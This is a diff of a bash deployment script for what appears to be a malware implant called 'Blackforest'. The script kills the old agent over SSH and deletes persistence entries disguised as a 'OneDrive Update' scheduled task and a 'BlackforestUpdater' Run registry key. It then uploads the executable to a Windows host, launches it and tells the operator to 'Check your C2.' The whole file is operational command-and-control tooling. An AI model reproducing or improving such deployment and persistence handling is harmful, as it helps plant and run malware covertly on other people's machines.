@@ -1,27 +1,34 @@
 #!/bin/bash
-# scripts/deploy.sh
-# One-Click Deployment (Upload + Execute)
+# scripts/manual_deploy.sh
+# Interactive Deployment - Handles usernames with spaces!
 
-# Ensure project root
-cd "$(dirname "$0")/.." || exit
+# Quote the entire string if it has spaces
+TARGET="pss trust@192.168.0.6"
 
-# Config
-REMOTE="Avengers@192.168.0.6"
-TARGET_DIR="C:/Users/Avengers/Downloads"
-LOCAL_BIN="bin/Blackforest.exe"
+echo "=============================================="
+echo "MANUAL DEPLOYMENT TO: $TARGET"
+echo "You will be asked for the password 3 times."
+echo "=============================================="
+echo ""
 
-if [ ! -f "$LOCAL_BIN" ]; then
-    echo "[-] Error: $LOCAL_BIN not found. Run scripts/build.sh first."
-    exit 1
-fi
+# 1. Cleanup
+echo "[STEP 1/3] CLEANING UP OLD AGENT..."
+echo "Running remote kill command. Type password >>"
+# Use quotes around "$TARGET" to handle the space in "pss trust"
+ssh "$TARGET" "Stop-Process -Name 'Blackforest' -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BlackforestUpdater' -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName 'OneDrive Update' -Confirm:\$false -ErrorAction SilentlyContinue; Remove-Item \"\$env:APPDATA\Blackforest\" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item \"\$env:USERPROFILE\Downloads\Blackforest.exe\" -Force -ErrorAction SilentlyContinue"
 
-echo "[*] Killing old process..."
-ssh $REMOTE "Stop-Process -Name 'Blackforest' -Force -ErrorAction SilentlyContinue"
+# 2. Upload
+echo ""
+echo "[STEP 2/3] UPLOADING LEVEL 5 AGENT..."
+echo "Uploading bin/Blackforest.exe. Type password >>"
+# Relative path 'Downloads/' resolves to C:\Users\pss trust\Downloads automatically
+scp bin/Blackforest.exe "$TARGET:Downloads/Blackforest.exe"
 
-echo "[*] Uploading Blackforest..."
-scp "$LOCAL_BIN" $REMOTE:$TARGET_DIR/Blackforest.exe
+# 3. Execution
+echo ""
+echo "[STEP 3/3] EXECUTING..."
+echo "Starting process. Type password >>"
+ssh "$TARGET" "Start-Process \"\$env:USERPROFILE\Downloads\Blackforest.exe\""
 
-echo "[*] Executing Agent..."
-ssh $REMOTE "Start-Process $TARGET_DIR/Blackforest.exe"
-
-echo "[+] Deployed! Check your C2."
+echo ""
+echo "[+] DEPLOYMENT COMPLETE. Check your C2."
